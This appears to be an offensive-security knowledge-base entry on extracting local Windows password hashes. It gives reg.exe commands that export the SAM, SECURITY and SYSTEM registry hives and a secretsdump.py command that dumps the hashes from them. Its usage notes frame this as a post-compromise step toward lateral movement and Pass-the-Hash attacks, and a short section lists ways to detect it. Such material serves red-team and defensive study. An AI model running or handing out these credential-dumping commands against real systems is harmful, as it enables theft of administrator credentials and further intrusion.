---
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
platforms:
  - Windows
tags:
  - credential-access
  - hash-dumping
validated: true
---

# extract-local-sam-hashes

## Code

```cmd
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Description

This sequence saves Windows registry hives using reg.exe and then uses Impacket's secretsdump.py to extract local SAM hashes, including administrator credentials, for offline analysis or Pass-the-Hash attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| c:\temp\sam.save | Path for SAM hive export | c:\temp\sam.save |
| c:\temp\security.save | Path for SECURITY hive export | c:\temp\security.save |
| c:\temp\system.save | Path for SYSTEM hive export | c:\temp\system.save |
| sam.save | Input SAM file for secretsdump | sam.save |
| security.save | Input SECURITY file | security.save |
| system.save | Input SYSTEM file | system.save |

## Usage

Run reg.exe commands as administrator on a Windows target to export hives, then execute secretsdump.py from a Linux/attacker machine with the files transferred. Useful after initial compromise to gather local creds for lateral movement.

## Detection

- Registry access to HKLM\SAM/SECURITY (Event ID 4657 with sensitive keys)
- File creation in temp directories with .save extensions
- Python processes executing secretsdump.py signatures in EDR logs

## Related

- [[procedures/Pass-the-Hash-Active-Directory-Attack]]
- [[tools/Impacket]]
